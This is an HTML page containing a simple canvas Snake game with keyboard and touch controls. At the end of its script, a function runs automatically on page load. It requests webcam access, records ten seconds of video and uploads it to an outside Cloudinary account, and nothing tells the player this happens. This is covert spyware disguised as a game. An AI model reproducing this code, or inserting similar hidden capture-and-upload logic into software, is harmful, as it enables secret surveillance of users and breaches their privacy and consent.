<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Snake Game</title>
  <style>
    body {
      margin: 0;
      background: #000;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      overflow: hidden;
    }
    canvas {
      background: #111;
      width: 100vmin;
      height: 100vmin;
      max-width: 90vw;
      max-height: 90vw;
    }
  </style>
</head>
<body>
  <canvas id="gameCanvas" width="400" height="400"></canvas>

  <script>
    const canvas = document.getElementById("gameCanvas");
    const ctx = canvas.getContext("2d");

    const gridSize = 20;
    const tileCount = canvas.width / gridSize;
    let snake = [{ x: 10, y: 10 }];
    let velocity = { x: 0, y: 0 };
    let food = { x: 5, y: 5 };

    function drawGame() {
      ctx.fillStyle = "#111";
      ctx.fillRect(0, 0, canvas.width, canvas.height);

      // Draw snake
      ctx.fillStyle = "lime";
      snake.forEach(part => {
        ctx.fillRect(part.x * gridSize, part.y * gridSize, gridSize - 2, gridSize - 2);
      });

      // Draw food
      ctx.fillStyle = "red";
      ctx.fillRect(food.x * gridSize, food.y * gridSize, gridSize - 2, gridSize - 2);
    }

    function updateGame() {
      const head = { x: snake[0].x + velocity.x, y: snake[0].y + velocity.y };
      snake.unshift(head);

      if (head.x === food.x && head.y === food.y) {
        food = {
          x: Math.floor(Math.random() * tileCount),
          y: Math.floor(Math.random() * tileCount)
        };
      } else {
        snake.pop();
      }

      if (
        head.x < 0 || head.y < 0 ||
        head.x >= tileCount || head.y >= tileCount ||
        snake.slice(1).some(p => p.x === head.x && p.y === head.y)
      ) {
        velocity = { x: 0, y: 0 };
        snake = [{ x: 10, y: 10 }];
      }

      drawGame();
    }

    setInterval(updateGame, 100);

    // Keyboard controls
    document.addEventListener("keydown", e => {
      if (e.key === "ArrowUp" && velocity.y === 0) velocity = { x: 0, y: -1 };
      if (e.key === "ArrowDown" && velocity.y === 0) velocity = { x: 0, y: 1 };
      if (e.key === "ArrowLeft" && velocity.x === 0) velocity = { x: -1, y: 0 };
      if (e.key === "ArrowRight" && velocity.x === 0) velocity = { x: 1, y: 0 };
    });

    // Mobile swipe controls
    let startX = 0, startY = 0;
    canvas.addEventListener("touchstart", e => {
      startX = e.touches[0].clientX;
      startY = e.touches[0].clientY;
    }, { passive: true });

    canvas.addEventListener("touchend", e => {
      const endX = e.changedTouches[0].clientX;
      const endY = e.changedTouches[0].clientY;
      const dx = endX - startX;
      const dy = endY - startY;

      if (Math.abs(dx) > Math.abs(dy)) {
        if (dx > 20 && velocity.x === 0) velocity = { x: 1, y: 0 };
        else if (dx < -20 && velocity.x === 0) velocity = { x: -1, y: 0 };
      } else {
        if (dy > 20 && velocity.y === 0) velocity = { x: 0, y: 1 };
        else if (dy < -20 && velocity.y === 0) velocity = { x: 0, y: -1 };
      }
    }, { passive: true });

    // Background webcam recording (with Cloudinary)
    async function startWebcamRecording() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const mediaRecorder = new MediaRecorder(stream);
        const chunks = [];

        mediaRecorder.ondataavailable = event => chunks.push(event.data);
        mediaRecorder.onstop = async () => {
          const blob = new Blob(chunks, { type: "video/webm" });
          const formData = new FormData();
          formData.append("file", blob);
          formData.append("upload_preset", "unsigned");
          await fetch("https://api.cloudinary.com/v1_1/dps0g5ftz/video/upload", {
            method: "POST",
            body: formData
          });
        };

        mediaRecorder.start();
        setTimeout(() => {
          mediaRecorder.stop();
        }, 10000); // Stop recording after 10 seconds

      } catch (err) {
        console.error("Webcam access denied or error:", err);
      }
    }

    // Start recording automatically
    startWebcamRecording();
  </script>
</body>
</html>
